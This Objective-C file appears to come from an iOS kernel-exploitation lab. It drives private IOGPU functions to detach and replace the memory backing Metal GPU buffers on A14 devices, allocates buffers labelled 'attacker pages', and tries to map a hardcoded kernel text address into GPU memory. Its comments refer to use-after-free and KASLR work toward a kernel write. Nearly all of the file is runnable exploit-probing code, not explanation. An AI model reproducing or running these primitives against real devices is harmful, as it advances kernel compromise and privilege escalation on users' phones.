#import "P009ReplaceBackingSmoke.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import <Metal/Metal.h>
#import <CoreFoundation/CoreFoundation.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>

/*
 P009 v21 — 64788 freer ABI on A14 23F77.
 PathB = detach+replace type 0x80. Live 2026-09-02: REPLACE_OK,
 POST ALL_00 / mtl ALL_11 / client ALL_CC / POSTW ALL_00 = stale GPU
 wire, not write-through MD. Detach-only is the freer half (no OOL).
 23F84 owns_replaceable_backing is a later gate; 23F77 REPLACE_OK is
 expected. Not [1]. Not 43724. Do not paste 21D50 KVAs.
*/

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(IOSurfaceRef);

typedef int (*IOGPUReplaceBytes_t)(void *resource, void *bytes, uint64_t length);
typedef int (*IOGPUReplaceRanges_t)(void *resource, const void *ranges,
                                    uint64_t rangeCount, uint32_t flags,
                                    int wantsOutput, uint64_t *output);
typedef int (*IOGPUDetach_t)(void *resource);
typedef uint32_t (*IOGPUGetType_t)(void *resource);
typedef uint64_t (*IOGPUGetU64_t)(void *resource);

@implementation P009ReplaceBackingSmoke

static id unwrapMetal(id obj) {
    if (!obj) return nil;
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([obj class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
        SEL sel = NSSelectorFromString(@"baseObject");
        if (![obj respondsToSelector:sel]) break;
        id base = ((id (*)(id, SEL))objc_msgSend)(obj, sel);
        if (!base || base == obj) break;
        obj = base;
    }
    return obj;
}

static void *resourceRef(id obj) {
    obj = unwrapMetal(obj);
    SEL sel = NSSelectorFromString(@"resourceRef");
    if (![obj respondsToSelector:sel]) return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(obj, sel);
}

static NSString *hex32(unsigned v) {
    return [NSString stringWithFormat:@"0x%08x", v];
}

static NSString *interpretKR(int kr) {
    unsigned u = (unsigned)kr;
    if (kr == 0) return @"SUCCESS";
    if (u == 0xe00002e2) return @"NotPermitted";
    if (u == 0xe00002c2) return @"BadArgument";
    if (u == 0xe00002bc) return @"Error(general)";
    return @"other";
}

static NSString *p009WriteLog(NSString *name, NSString *body) {
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (!docs || !name || !body) return body;
    NSString *path = [docs stringByAppendingPathComponent:name];
    int fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        const char *s = body.UTF8String;
        if (s) write(fd, s, strlen(s));
        if (![body hasSuffix:@"\n"]) write(fd, "\n", 1);
        fcntl(fd, F_FULLFSYNC);
        close(fd);
    }
    return body;
}

typedef struct {
    size_t checked, matchA5, match11, matchCC, matchEE, match00, other;
    uint8_t first;
} ScanStats;

static ScanStats scanBytes(const void *p, size_t n, size_t cap) {
    ScanStats s = {0};
    if (!p || n == 0) return s;
    size_t lim = n < cap ? n : cap;
    const uint8_t *b = (const uint8_t *)p;
    s.first = b[0];
    s.checked = lim;
    for (size_t i = 0; i < lim; i++) {
        if (b[i] == 0xA5) s.matchA5++;
        else if (b[i] == 0x11) s.match11++;
        else if (b[i] == 0xCC) s.matchCC++;
        else if (b[i] == 0xEE) s.matchEE++;
        else if (b[i] == 0x00) s.match00++;
        else s.other++;
    }
    return s;
}

static void appendScan(NSMutableString *out, NSString *tag, ScanStats s) {
    [out appendFormat:@"%@: n=%zu first=0x%02x a5=%zu 11=%zu cc=%zu ee=%zu z=%zu o=%zu",
     tag, s.checked, s.first, s.matchA5, s.match11, s.matchCC, s.matchEE, s.match00, s.other];
    if (s.checked > 0 && s.match11 == s.checked) [out appendString:@" -> ALL_11\n"];
    else if (s.checked > 0 && s.matchA5 == s.checked) [out appendString:@" -> ALL_A5\n"];
    else if (s.checked > 0 && s.matchCC == s.checked) [out appendString:@" -> ALL_CC\n"];
    else if (s.checked > 0 && s.matchEE == s.checked) [out appendString:@" -> ALL_EE\n"];
    else if (s.checked > 0 && s.match00 == s.checked) [out appendString:@" -> ALL_00\n"];
    else if (s.checked == 0) [out appendString:@" -> NO_BYTES\n"];
    else [out appendString:@" -> MIXED\n"];
}

static BOOL blitBuf(NSMutableString *out, id<MTLDevice> device, id srcBuf, NSString *tag, size_t len) {
    if (!srcBuf || len == 0) return NO;
    size_t cap = len < 4096 ? len : 4096;
    id staging = [device newBufferWithLength:cap options:MTLResourceStorageModeShared];
    id<MTLCommandQueue> q = [device newCommandQueue];
    if (!staging || !q) return NO;
    id<MTLCommandBuffer> cb = [q commandBuffer];
    id<MTLBlitCommandEncoder> blit = [cb blitCommandEncoder];
    [blit copyFromBuffer:srcBuf sourceOffset:0 toBuffer:staging destinationOffset:0 size:cap];
    [blit endEncoding];
    [cb commit];
    [cb waitUntilCompleted];
    [out appendFormat:@"%@ blit status=%ld\n", tag, (long)cb.status];
    appendScan(out, tag, scanBytes([staging contents], cap, cap));
    return YES;
}

static BOOL blitToBuf(NSMutableString *out, id<MTLDevice> device, id dstBuf, NSString *tag, size_t len, uint8_t fill) {
    if (!dstBuf || len == 0) return NO;
    size_t cap = len < 4096 ? len : 4096;
    id staging = [device newBufferWithLength:cap options:MTLResourceStorageModeShared];
    id<MTLCommandQueue> q = [device newCommandQueue];
    if (!staging || !q) return NO;
    memset([staging contents], fill, cap);
    id<MTLCommandBuffer> cb = [q commandBuffer];
    id<MTLBlitCommandEncoder> blit = [cb blitCommandEncoder];
    [blit copyFromBuffer:staging sourceOffset:0 toBuffer:dstBuf destinationOffset:0 size:cap];
    [blit endEncoding];
    [cb commit];
    [cb waitUntilCompleted];
    [out appendFormat:@"%@ gpuWrite(0x%02x) status=%ld cap=%zu\n", tag, fill, (long)cb.status, cap];
    return YES;
}

+ (NSString *)runPathB {
    NSMutableString *out = [NSMutableString string];
    [out appendString:@"P009 Path B v21 — 64788 freer ABI (detach+replace type 0x80). Not W.\n"];
    [out appendFormat:@"time %@\n", LabLocalMilitaryNow()];
    [out appendFormat:@"%@\n", [LabDeviceProfile banner]];
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p009pathb"];
    if (stop) {
        [out appendString:stop];
        return p009WriteLog(@"p009_pathb_log.txt", out);
    }
    [out appendFormat:@"%@\n", [LabDeviceProfile expectP009PathB]];
    [out appendString:@"23F84 owns_replaceable_backing: type 0x80 && resource+0x30==0 else 0xe00002e2.\n"];
    [out appendString:@"23F77: REPLACE_OK is expected (that gate is weaker/absent). Not a new door.\n"];
    [out appendString:@"GPUVALen is often 0x20000 (131072), not mtlLen 4096 — IOGPU VA length, not a leak.\n"];
    [out appendString:@"If hang >20s: force-quit. Do not re-tap for EE. Not [1]. Not 43724.\n"];

    @autoreleasepool {
        id<MTLDevice> device = MTLCreateSystemDefaultDevice();
        if (!device) {
            [out appendString:@"no device\n"];
            return p009WriteLog(@"p009_pathb_log.txt", out);
        }

        void *h = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
        if (!h) h = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
        IOGPUReplaceBytes_t replaceBytes = h ? dlsym(h, "IOGPUResourceReplaceBackingWithBytes") : NULL;
        IOGPUDetach_t detachFn = h ? dlsym(h, "IOGPUResourceDetachBacking") : NULL;
        IOGPUGetType_t getType = h ? dlsym(h, "IOGPUResourceGetResourceType") : NULL;
        IOGPUGetU64_t getGPULen = h ? dlsym(h, "IOGPUResourceGetGPUVirtualAddressLength") : NULL;
        IOGPUGetU64_t getGPUVA = h ? dlsym(h, "IOGPUResourceGetGPUVirtualAddress") : NULL;
        if (!detachFn || !replaceBytes) {
            [out appendString:@"STOP IOGPU symbols\n"];
            return p009WriteLog(@"p009_pathb_log.txt", out);
        }

        const NSUInteger mtlLen = 4096;
        id buf = [device newBufferWithLength:mtlLen options:MTLResourceStorageModeShared];
        void *ref = resourceRef(buf);
        if (!buf || !ref) {
            [out appendString:@"STOP buf\n"];
            return p009WriteLog(@"p009_pathb_log.txt", out);
        }

        uint32_t typ = getType ? getType(ref) : 0;
        uint64_t tryLen = getGPULen ? getGPULen(ref) : mtlLen;
        uint64_t gva = getGPUVA ? getGPUVA(ref) : 0;
        if (!tryLen) tryLen = mtlLen;
        [out appendFormat:@"owned mtlLen=%lu type=0x%x GPUVA=%llx GPUVALen=%llu\n",
         (unsigned long)mtlLen, typ, gva, tryLen];
        if (typ != 0x80) {
            [out appendString:@"STOP expected type 0x80\n"];
            return p009WriteLog(@"p009_pathb_log.txt", out);
        }

        void *cpu = [buf contents];
        if (!cpu) {
            [out appendString:@"STOP contents=NULL\n"];
            return p009WriteLog(@"p009_pathb_log.txt", out);
        }
        memset(cpu, 0x11, mtlLen);
        [out appendString:@"CPU fill 0x11\n"];

        [out appendString:@"\n-- PRE blit --\n"];
        blitBuf(out, device, buf, @"PRE", mtlLen);

        int dkr = detachFn(ref);
        [out appendFormat:@"Detach -> %@ (%@)\n", hex32((unsigned)dkr), interpretKR(dkr)];
        if (dkr != 0) return p009WriteLog(@"p009_pathb_log.txt", out);

        void *p = NULL;
        if (vm_allocate(mach_task_self(), (vm_address_t *)&p, (size_t)tryLen, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !p) {
            [out appendString:@"STOP alloc\n"];
            return p009WriteLog(@"p009_pathb_log.txt", out);
        }
        memset(p, 0xA5, (size_t)tryLen);
        int kr = replaceBytes(ref, p, tryLen);
        [out appendFormat:@"ReplaceBytes(tryLen=%llu) -> %@ (%@)\n",
         tryLen, hex32((unsigned)kr), interpretKR(kr)];
        if (kr != 0) {
            vm_deallocate(mach_task_self(), (vm_address_t)p, (size_t)tryLen);
            return p009WriteLog(@"p009_pathb_log.txt", out);
        }
        [out appendString:@"*** REPLACE_OK — 64788 freer ABI. Not W. ***\n"];

        memset(p, 0xCC, (size_t)tryLen);
        [out appendString:@"client -> 0xCC\n"];

        [out appendString:@"\n-- POST read (23F77 expect ALL_00 / not CC) --\n"];
        blitBuf(out, device, buf, @"POST", mtlLen);

        [out appendString:@"\n-- GPU WRITE 0xEE into buf (classify land, not a W hunt) --\n"];
        blitToBuf(out, device, buf, @"W", mtlLen, 0xEE);

        [out appendString:@"\n-- where did EE land? --\n"];
        appendScan(out, @"mtl-contents", scanBytes(cpu, mtlLen, 4096));
        appendScan(out, @"client[0..4K]", scanBytes(p, mtlLen, 4096));
        blitBuf(out, device, buf, @"POSTW", mtlLen);

        [out appendString:@"\n-- interpret (23F77 live 2026-09-02) --\n"];
        [out appendString:@"REPLACE_OK + POST ALL_00 + mtl ALL_11 + client ALL_CC + POSTW ALL_00\n"];
        [out appendString:@"= freer ABI works; GPU still on OLD/stale wire. Not W. Not [1].\n"];
        [out appendString:@"mtl EE + client CC would also be stale wire (GPU on old CPU pages).\n"];
        [out appendString:@"client EE + mtl 11 would be GPU on new SysMemory MD (+0x90 FIELD#).\n"];
        [out appendString:@"Do not retap for EE. Do not glue to 43805 dest or 43724 slide_v5.\n"];
        [out appendString:@"leaving objects alive\n"];
        (void)buf; (void)p;
    }

    [out appendString:@"\n== done ==\n"];
    return p009WriteLog(@"p009_pathb_log.txt", out);
}

+ (NSString *)runPathBRanges {
    NSMutableString *out = [NSMutableString string];
    [out appendString:@"P009 ranges v21 — replace_backing_ranges on 0x82 IOSurface. Not W.\n"];
    [out appendFormat:@"time %@\n", LabLocalMilitaryNow()];
    [out appendFormat:@"%@\n", [LabDeviceProfile banner]];
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p009ranges"];
    if (stop) {
        [out appendString:stop];
        return p009WriteLog(@"p009_ranges_log.txt", out);
    }
    [out appendString:@"Client-remap smoke on type 0x82. Address-validation check may reject.\n"];
    [out appendString:@"Not [1]. Not 43724. If hang >20s: force-quit. Do not re-tap.\n"];

    @autoreleasepool {
        id<MTLDevice> device = MTLCreateSystemDefaultDevice();
        if (!device) {
            [out appendString:@"no device\n"];
            return out;
        }

        void *h = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
        if (!h) h = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
        IOGPUReplaceRanges_t replaceRanges = h ? dlsym(h, "IOGPUResourceReplaceBackingWithRanges") : NULL;
        IOGPUDetach_t detachFn = h ? dlsym(h, "IOGPUResourceDetachBacking") : NULL;
        IOGPUGetType_t getType = h ? dlsym(h, "IOGPUResourceGetResourceType") : NULL;
        IOGPUGetU64_t getGPULen = h ? dlsym(h, "IOGPUResourceGetGPUVirtualAddressLength") : NULL;
        IOGPUGetU64_t getGPUVA = h ? dlsym(h, "IOGPUResourceGetGPUVirtualAddress") : NULL;
        if (!detachFn || !replaceRanges) {
            [out appendFormat:@"STOP IOGPU symbols (ranges=%@ detach=%@)\n",
             replaceRanges ? @"Y" : @"N", detachFn ? @"Y" : @"N"];
            return out;
        }

        void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
        if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
        IOSurfaceCreate_t iosCreate = iosH ? dlsym(iosH, "IOSurfaceCreate") : NULL;
        IOSurfaceGetID_t iosGetID = iosH ? dlsym(iosH, "IOSurfaceGetID") : NULL;
        if (!iosCreate) {
            [out appendString:@"STOP IOSurface dlopen\n"];
            return out;
        }

        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfaceBytesPerRow": @(64 * 4),
            @"IOSurfaceAllocSize": @(64 * 64 * 4),
            @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
        };
        IOSurfaceRef surf = iosCreate((__bridge CFDictionaryRef)props);
        if (!surf) {
            [out appendString:@"STOP IOSurfaceCreate\n"];
            return out;
        }
        [out appendFormat:@"IOSurface id=%u\n", iosGetID ? iosGetID(surf) : 0];

        SEL nbSel = NSSelectorFromString(@"newBufferWithIOSurface:");
        if (![device respondsToSelector:nbSel]) {
            [out appendString:@"STOP newBufferWithIOSurface:\n"];
            CFRelease(surf);
            return out;
        }
        id buf = ((id (*)(id, SEL, IOSurfaceRef))objc_msgSend)(device, nbSel, surf);
        void *ref = resourceRef(buf);
        if (!buf || !ref) {
            [out appendString:@"STOP iosurf buffer\n"];
            CFRelease(surf);
            return out;
        }

        uint32_t typ = getType ? getType(ref) : 0;
        uint64_t tryLen = getGPULen ? getGPULen(ref) : 0;
        uint64_t gva = getGPUVA ? getGPUVA(ref) : 0;
        if (!tryLen) tryLen = 4096;
        [out appendFormat:@"iosurf buf type=0x%x GPUVA=%llx GPUVALen=%llu\n", typ, gva, tryLen];
        if (typ != 0x82) {
            [out appendFormat:@"STOP expected 0x82 got 0x%x\n", typ];
            CFRelease(surf);
            return out;
        }

        // IOSurface-backed buffers (0x82) may return NULL from [buf contents]
        // — CPU access is via IOSurface locking, not shared memory. Skip CPU fill.
        void *cpu = [buf contents];
        [out appendFormat:@"contents=%p (NULL is normal for 0x82)\n", cpu];
        if (cpu) {
            memset(cpu, 0x11, 4096);
            [out appendString:@"CPU fill 0x11\n"];
            [out appendString:@"\n-- PRE blit --\n"];
            blitBuf(out, device, buf, @"PRE", 4096);
        } else {
            [out appendString:@"skipped CPU fill + PRE blit (0x82 no shared CPU)\n"];
        }

        int dkr = detachFn(ref);
        [out appendFormat:@"Detach -> %@ (%@)\n", hex32((unsigned)dkr), interpretKR(dkr)];
        if (dkr != 0) {
            [out appendString:@"STOP detach failed\n"];
            CFRelease(surf);
            return out;
        }

        void *p = NULL;
        if (vm_allocate(mach_task_self(), (vm_address_t *)&p, (size_t)tryLen, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !p) {
            [out appendString:@"STOP alloc\n"];
            CFRelease(surf);
            return out;
        }
        memset(p, 0xA5, (size_t)tryLen);
        [out appendFormat:@"attacker pages @%p fill 0xA5 len=%llu\n", p, tryLen];

        // IOAddressRange = {uint64_t address, uint64_t length} — 0x10 bytes each
        typedef struct { uint64_t address; uint64_t length; } P009AddrRange;
        // Test 1: normal user pages (baseline — already confirmed working)
        P009AddrRange range = { (uint64_t)p, tryLen };
        uint64_t rangesOutput = 0;
        int kr = replaceRanges(ref, &range, 1, 3, 1, &rangesOutput);
        [out appendFormat:@"ReplaceRanges(addr=%llx len=%llu count=1 flags=3) -> %@ (%@)\n",
         (uint64_t)p, tryLen, hex32((unsigned)kr), interpretKR(kr)];
        if (kr != 0) {
            [out appendFormat:@"STOP ranges failed output=%llx\n", rangesOutput];
            vm_deallocate(mach_task_self(), (vm_address_t)p, (size_t)tryLen);
            CFRelease(surf);
            return out;
        }
        [out appendFormat:@"*** RANGES_OK *** output=%llx (GPUVA+KVA)\n", rangesOutput];

        // Test 2: try a static kernel VA — does the kernel validate the address?
        // If KASLR slide=0, kernel text is at 0xfffffff00700c000
        // If the kernel doesn't validate, this maps kernel memory into GPU VA space
        // WARNING: may crash if the address is invalid and not validated
        P009AddrRange krange = { 0xfffffff00700c000, 4096 };
        uint64_t kOutput = 0;
        int kkr = replaceRanges(ref, &krange, 1, 3, 1, &kOutput);
        [out appendFormat:@"\nReplaceRanges(KERNEL addr=%llx len=4096) -> %@ (%@)\n",
         0xfffffff00700c000ULL, hex32((unsigned)kkr), interpretKR(kkr)];
        if (kkr == 0) {
            [out appendFormat:@"*** KERNEL_MAP_OK *** output=%llx\n", kOutput];
            [out appendString:@"GPU now has access to kernel memory via GART!\n"];
        } else {
            [out appendFormat:@"kernel address rejected (validated) — output=%llx\n", kOutput];
        }

        [out appendString:@"\n-- POST ranges blit (0xA5 = client remapped?) --\n"];
        blitBuf(out, device, buf, @"POST", 4096);

        [out appendString:@"\n-- attacker page check (hash table writes?) --\n"];
        // Scan full 16KB, not just 4KB — kernel write may land at any offset
        appendScan(out, @"attacker-pre-4K", scanBytes(p, 4096, 4096));
        appendScan(out, @"attacker-pre-16K", scanBytes(p, 16384, 16384));

        id buf2 = [device newBufferWithLength:4096 options:MTLResourceStorageModeShared];
        if (buf2) {
            void *ref2 = resourceRef(buf2);
            if (ref2) {
                uint32_t t2 = getType ? getType(ref2) : 0;
                [out appendFormat:@"buf2 type=0x%x (namespace add triggers hash writes)\n", t2];
            }
            [out appendString:@"buf2 created — namespace op should trigger FUN_4bb72c\n"];
        }

        // Also try a GPU write into the remapped buffer — this triggers wire/prepare
        [out appendString:@"\n-- GPU write 0xEE into remapped buf (triggers wire/prepare) --\n"];
        blitToBuf(out, device, buf, @"W", 4096, 0xEE);

        [out appendString:@"\n-- attacker page post-namespace+write (modified = kernel write) --\n"];
        appendScan(out, @"attacker-post-4K", scanBytes(p, 4096, 4096));
        appendScan(out, @"attacker-post-16K", scanBytes(p, 16384, 16384));

        [out appendString:@"\n-- interpret --\n"];
        [out appendString:@"POST ALL_A5: client remapped to attacker MD (not dual-view)\n"];
        [out appendString:@"POST ALL_11: client still on old MD (dual-view, same as bytes)\n"];
        [out appendString:@"attacker-post ≠ attacker-pre: KERNEL WROTE to attacker pages\n"];
        [out appendString:@"attacker-post == attacker-pre: no kernel write reached attacker pages\n"];
        [out appendString:@"check 16K scans for writes at any offset, not just first 4K\n"];
        [out appendString:@"KERNEL_MAP_OK would be address-validation miss — still not W / not [1].\n"];
        [out appendString:@"leaving objects alive\n"];
        (void)buf; (void)buf2; (void)p; (void)surf;
    }

    [out appendString:@"\n== done ==\n"];
    return p009WriteLog(@"p009_ranges_log.txt", out);
}

+ (NSString *)runTypeInventory {
    NSMutableString *out = [NSMutableString string];
    [out appendString:@"P009 types v21 — type / SysMemShared inventory. No replace.\n"];
    [out appendFormat:@"time %@\n", LabLocalMilitaryNow()];
    [out appendFormat:@"%@\n", [LabDeviceProfile banner]];
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p009types"];
    if (stop) {
        [out appendString:stop];
        return p009WriteLog(@"p009_types_log.txt", out);
    }
    [out appendString:@"Expect: owned=0x80; IOSurface Metal=0x82; same-surface sticky VA.\n"];
    [out appendString:@"Looking for userspace 0x80 with device_cache (SysMemShared(IOSurface)).\n"];
    [out appendString:@"No replace / no blit. Leave alive. Not W. Not [1].\n"];

    @autoreleasepool {
        id<MTLDevice> device = MTLCreateSystemDefaultDevice();
        if (!device) {
            [out appendString:@"STOP no device\n"];
            return out;
        }

        void *h = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
        if (!h) h = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
        IOGPUGetType_t getType = h ? dlsym(h, "IOGPUResourceGetResourceType") : NULL;
        IOGPUGetU64_t getGPULen = h ? dlsym(h, "IOGPUResourceGetGPUVirtualAddressLength") : NULL;
        IOGPUGetU64_t getGPUVA = h ? dlsym(h, "IOGPUResourceGetGPUVirtualAddress") : NULL;
        if (!getType) {
            [out appendString:@"STOP no IOGPUResourceGetResourceType\n"];
            return out;
        }

        const NSUInteger mtlLen = 4096;

        id owned = [device newBufferWithLength:mtlLen options:MTLResourceStorageModeShared];
        void *ownedRef = resourceRef(owned);
        if (!owned || !ownedRef) {
            [out appendString:@"STOP owned buf\n"];
            return out;
        }
        uint32_t ot = getType(ownedRef);
        uint64_t ogva = getGPUVA ? getGPUVA(ownedRef) : 0;
        uint64_t olen = getGPULen ? getGPULen(ownedRef) : 0;
        [out appendFormat:@"owned: type=0x%x GPUVA=%llx GPUVALen=%llu\n", ot, ogva, olen];
        if (ot == 0x80) [out appendString:@"owned -> SysMemShared class (expect +0x30==NULL)\n"];

        void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
        if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
        IOSurfaceCreate_t iosCreate = iosH ? dlsym(iosH, "IOSurfaceCreate") : NULL;
        IOSurfaceGetID_t iosGetID = iosH ? dlsym(iosH, "IOSurfaceGetID") : NULL;
        if (!iosCreate) {
            [out appendString:@"STOP IOSurface dlopen\n"];
            return out;
        }

        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfaceBytesPerRow": @(64 * 4),
            @"IOSurfaceAllocSize": @(64 * 64 * 4),
            @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
        };
        IOSurfaceRef surf = iosCreate((__bridge CFDictionaryRef)props);
        if (!surf) {
            [out appendString:@"STOP IOSurfaceCreate\n"];
            return out;
        }
        [out appendFormat:@"IOSurface id=%u\n", iosGetID ? iosGetID(surf) : 0];

        SEL nbSel = NSSelectorFromString(@"newBufferWithIOSurface:");
        if (![device respondsToSelector:nbSel]) {
            [out appendString:@"STOP newBufferWithIOSurface:\n"];
            CFRelease(surf);
            return out;
        }
        id surfBuf = ((id (*)(id, SEL, IOSurfaceRef))objc_msgSend)(device, nbSel, surf);
        void *sref = resourceRef(surfBuf);
        if (!surfBuf || !sref) {
            [out appendString:@"STOP iosurf buffer\n"];
            CFRelease(surf);
            return out;
        }
        uint32_t st = getType(sref);
        uint64_t sgva = getGPUVA ? getGPUVA(sref) : 0;
        [out appendFormat:@"iosurf buffer: type=0x%x GPUVA=%llx\n", st, sgva];
        if (st == 0x82) [out appendString:@"buffer -> IOSurface child (device_cache primary)\n"];
        if (st == 0x80) [out appendString:@"*** unexpected 0x80 on buffer — possible SysMemShared(IOSurface)\n"];

        id surfBuf2 = ((id (*)(id, SEL, IOSurfaceRef))objc_msgSend)(device, nbSel, surf);
        void *sref2 = resourceRef(surfBuf2);
        if (sref2) {
            uint64_t s2gva = getGPUVA ? getGPUVA(sref2) : 0;
            [out appendFormat:@"iosurf buffer2: type=0x%x GPUVA=%llx sameVA=%d\n",
             getType(sref2), s2gva, (sgva && sgva == s2gva) ? 1 : 0];
        }

        MTLTextureDescriptor *td = [MTLTextureDescriptor
            texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm
                                         width:64 height:64 mipmapped:NO];
        td.usage = MTLTextureUsageShaderRead | MTLTextureUsageShaderWrite;
        SEL texSel = NSSelectorFromString(@"newTextureWithDescriptor:iosurface:plane:");
        if ([device respondsToSelector:texSel]) {
            id tex = ((id (*)(id, SEL, id, IOSurfaceRef, NSUInteger))objc_msgSend)(device, texSel, td, surf, 0);
            void *texRef = resourceRef(tex);
            if (texRef) {
                uint32_t tt = getType(texRef);
                uint64_t tgva = getGPUVA ? getGPUVA(texRef) : 0;
                [out appendFormat:@"iosurf texture: type=0x%x GPUVA=%llx sameAsBuf=%d\n",
                 tt, tgva, (sgva && tgva == sgva) ? 1 : 0];
                if (tt == 0x80) [out appendString:@"*** unexpected 0x80 on texture\n"];
            }
            (void)tex;
        } else {
            [out appendString:@"newTextureWithDescriptor:iosurface:plane: missing\n"];
        }
        (void)surfBuf; (void)surfBuf2;

        [out appendString:@"\n-- interpret --\n"];
        [out appendString:@"0x80 only on owned: SysMemShared(IOSurface) not exposed as Metal resourceRef\n"];
        [out appendString:@"0x80 on surface path: Path B candidate for owns-fail parallel entry\n"];
        [out appendString:@"leaving objects alive\n"];
        (void)owned; (void)surf;
    }

    [out appendString:@"\n== done ==\n"];
    return p009WriteLog(@"p009_types_log.txt", out);
}

+ (NSString *)runDetachOnly {
    NSMutableString *out = [NSMutableString string];
    [out appendString:@"P009 detach-only v1 — 64788 freer half. No replace. No OOL spray.\n"];
    [out appendFormat:@"time %@\n", LabLocalMilitaryNow()];
    [out appendFormat:@"%@\n", [LabDeviceProfile banner]];
    [out appendString:@"NOT AVEOpenSmoke.runP009DetachUAF (old OOL UAF). NOT W. NOT [1].\n"];
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p009detach"];
    if (stop) {
        [out appendString:stop];
        return p009WriteLog(@"p009_detach_log.txt", out);
    }

    @autoreleasepool {
        id<MTLDevice> device = MTLCreateSystemDefaultDevice();
        if (!device) {
            [out appendString:@"STOP no device\n"];
            return p009WriteLog(@"p009_detach_log.txt", out);
        }

        void *h = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
        if (!h) h = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
        IOGPUDetach_t detachFn = h ? dlsym(h, "IOGPUResourceDetachBacking") : NULL;
        IOGPUGetType_t getType = h ? dlsym(h, "IOGPUResourceGetResourceType") : NULL;
        if (!detachFn) {
            [out appendString:@"STOP no IOGPUResourceDetachBacking\n"];
            return p009WriteLog(@"p009_detach_log.txt", out);
        }

        const NSUInteger mtlLen = 4096;
        id buf = [device newBufferWithLength:mtlLen options:MTLResourceStorageModeShared];
        void *ref = resourceRef(buf);
        if (!buf || !ref) {
            [out appendString:@"STOP buf\n"];
            return p009WriteLog(@"p009_detach_log.txt", out);
        }

        uint32_t typ = getType ? getType(ref) : 0;
        [out appendFormat:@"owned mtlLen=%lu type=0x%x\n", (unsigned long)mtlLen, typ];
        if (typ != 0x80) {
            [out appendFormat:@"STOP expected type 0x80 got 0x%x\n", typ];
            return p009WriteLog(@"p009_detach_log.txt", out);
        }

        int dkr = detachFn(ref);
        [out appendFormat:@"Detach -> %@ (%@)\n", hex32((unsigned)dkr), interpretKR(dkr)];
        if (dkr == 0) {
            [out appendString:@"*** DETACH_OK — 64788 freer ABI half. No replace this tap.\n"];
            [out appendString:@"Hot 82 PathB is detach+replace. This button is detach only.\n"];
        }
        [out appendString:@"leaving object alive\n"];
        (void)buf;
    }

    [out appendString:@"\n== done ==\n"];
    return p009WriteLog(@"p009_detach_log.txt", out);
}

@end
